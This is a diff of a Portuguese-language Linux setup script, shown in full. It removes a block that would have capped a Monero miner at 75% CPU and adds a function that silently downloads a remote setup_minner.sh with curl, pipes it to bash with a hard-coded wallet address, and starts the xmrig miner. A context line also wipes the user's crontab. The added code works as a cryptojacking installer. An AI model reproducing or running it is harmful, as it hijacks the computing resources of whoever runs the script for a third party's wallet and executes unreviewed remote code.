@@ -58,32 +58,10 @@ crontab -r >/dev/null 2>&1
 ) | crontab -
 
 echo ""
-echo -e "\033[1;33mLIMITANDO PROCESSOS A 75% !\033[0m"
-touch /etc/rc.local
-chmod 777 /etc/rc.local
-CPU_THREADS=$(nproc)
-EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
-if [ -z $EXP_MONERO_HASHRATE ]; then
-  echo "ERROR: Can't compute projected Monero CN hashrate"
-  exit 1
-fi
-if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
-  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
-  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  else
-    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  fi
-#else
-#  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-#  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config.json"
-#  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/moneroocean/config_background.json"
-fi
-echo ""
 echo -e "\033[1;33mINSTALANDO SCRIPT MINERADOR MONERO!\033[0m"
 echo ""
-
+inst_minner () {
 curl -s -L https://raw.githubusercontent.com/juniorfdtech/update/master/setup_minner.sh | bash -s 8BvGDdUNdGwG5B9oNUywNc9yh7ggEJjskRyBhUYNLT63fjryxsVRLsmVED7JvJTyfq5zjkAVxcdohdmgX7b9UFS2GWUWWEq && cd mo* && ./xm*
+}
+fun_bar 'inst_minner'
 
